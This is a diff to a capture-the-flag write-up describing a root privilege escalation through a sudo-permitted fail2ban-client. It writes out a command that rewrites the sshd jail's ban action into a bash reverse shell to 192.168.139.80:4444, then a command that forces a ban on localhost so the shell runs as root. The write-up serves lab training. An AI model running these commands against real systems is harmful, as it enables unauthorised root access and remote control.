@@ -29,3 +29,26 @@ To obtain the root flag one had to have root priviliges and this made me curoius
 to run as sudo and i got the binary:
 
 ![permission](permission.png)
+In this permission the current user **asterisk** is allowed to run fail2ban which is a open source Intrusion Prevention System used to prevent ssh bruteforce by monitoring logs.
+*some nice rabbit hole to follow* Understand how fail2ban works:
+
+Fail2ban will check the logs and detect any bruteforce attempts and it will executes commands (root commands) to ban that ip trying to bruteforce or a given period of time.
+Take advatage of the commands being excuted and force fail2ban to execute a reverse shell to our system:
+```
+./usr/bin/fail2ban-client set sshd action iptables-multiport actionban "/bin/bash -c 'bash -i >& /dev/tcp/192.168.139.80/4444 0>&1'"
+```
+The force a ban to the localhost to force the command for reverse shell be excuted:
+```
+sudo fail2ban-client set sshd banip  127.0.0.1
+```
+![priv](privesc.png)
+
+Having our netcat ready and listening for any incoming connection we gained access to the system now as root.
+![root](access_root.png)
+
+The root flag was a proof of gaining access as the root user and ability to execute any system commands.
+![root_flag](root_flag.png)
+
+- LESSON:
+	- Common security misconfiguration can be bypassed compromise systems more than securing them as intended in their use.
+
